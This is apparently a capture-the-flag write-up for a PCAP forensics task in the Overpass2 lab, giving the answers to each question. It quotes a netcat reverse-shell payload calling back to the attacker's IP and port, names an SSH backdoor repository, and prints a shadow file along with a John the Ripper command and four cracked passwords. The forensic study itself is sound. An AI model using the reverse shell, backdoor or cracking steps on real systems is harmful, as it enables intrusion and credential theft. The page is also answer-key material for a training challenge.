<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Task 1 Forensics - Analyse the PCAP</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  
    <script type="text/javascript">
        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
        if (!in_frame()) {
            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
            window.location = 'index.html#' + page;
        }
    </script>
</head>
<body><div class="page"><h1 class="title">Task 1 Forensics - Analyse the PCAP</h1><br/><strong>What was the URL of the page they used to upload a reverse shell?   </strong>          <br />    Open in Wireshark<br />    Filter for HTTP packets<br />    There's a POST call accessing /development/upload.php<br />    <br /><strong>    Answer: /development/</strong><br /><br /><br /><strong>What payload did the attacker use to gain access?<br />    </strong>Exporting upload.php which was uploaded and then acccessed later on reveals the payload<strong><br />    <br />    Answer: </strong><div class="codebox"><div class="codebox">exec("rm&nbsp;/tmp/f;mkfifo&nbsp;/tmp/f;cat&nbsp;/tmp/f|/bin/sh&nbsp;-i&nbsp;2&gt;&amp;1|nc&nbsp;192.168.170.145&nbsp;4242&nbsp;&gt;/tmp/f"</div></div><br />    <br /><br /><br /><br />What password did the attacker use to privesc?<br />    Filter ip.src == 192.168.170.145 &amp;&amp; tcp.port == 4242<br />    because that is the IP and the port over which a connection to the attacker controlled server was openend<br />    <br />    follow TCP stream<br />    you can see everything that was sent including<br />    su james<br />    and the password that was entered<strong><br />    <br />    Answer: whenevernoteartinstant<br /><br /><br /><br />How did the attacker establish persistence?<br />    </strong>Following the log you can see that at one point the Git repository at <a href="https://github.com/NinjaJc01/ssh-backdoor">https://github.com/NinjaJc01/ssh-backdoor</a> was cloned onto the machine<strong><br />    <br />    Answer: https://github.com/NinjaJc01/ssh-backdoor<br /><br /><br /><br /><br /><br />Using the fasttrack wordlist, how many of the system passwords were crackable?</strong><br />    Copy the shadow file that was printed out in the log and put it in a new file on your machine<br />    start JohnTheRipper as follows:<br />   <div class="codebox"><div class="codebox">&nbsp;john&nbsp;--wordlist=./fasttrack.txt&nbsp;/home/user/Desktop/THM/Overpass2/shadow</div></div><br /><br /><br />    Content of the shadow file:<br />    <br />    <div class="codebox"><div class="codebox">root:*:18295:0:99999:7:::<br />daemon:*:18295:0:99999:7:::<br />bin:*:18295:0:99999:7:::<br />sys:*:18295:0:99999:7:::<br />sync:*:18295:0:99999:7:::<br />games:*:18295:0:99999:7:::<br />man:*:18295:0:99999:7:::<br />lp:*:18295:0:99999:7:::<br />mail:*:18295:0:99999:7:::<br />news:*:18295:0:99999:7:::<br />uucp:*:18295:0:99999:7:::<br />proxy:*:18295:0:99999:7:::<br />www-data:*:18295:0:99999:7:::<br />backup:*:18295:0:99999:7:::<br />list:*:18295:0:99999:7:::<br />irc:*:18295:0:99999:7:::<br />gnats:*:18295:0:99999:7:::<br />nobody:*:18295:0:99999:7:::<br />systemd-network:*:18295:0:99999:7:::<br />systemd-resolve:*:18295:0:99999:7:::<br />syslog:*:18295:0:99999:7:::<br />messagebus:*:18295:0:99999:7:::<br />_apt:*:18295:0:99999:7:::<br />lxd:*:18295:0:99999:7:::<br />uuidd:*:18295:0:99999:7:::<br />dnsmasq:*:18295:0:99999:7:::<br />landscape:*:18295:0:99999:7:::<br />pollinate:*:18295:0:99999:7:::<br />sshd:*:18464:0:99999:7:::<br />james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7:::<br />paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:18464:0:99999:7:::<br />szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7:::<br />bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:18464:0:99999:7:::<br />muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7:::</div></div><br /><br /><br />    Cracked passwords:<br />    <br />    secret12         (bee)<br />    abcd123          (szymex)<br />    1qaz2wsx         (muirland)<br />    secuirty3        (paradox)<br />    <br /><strong>    Answer: 4</strong><br />                                                    </div></body></html>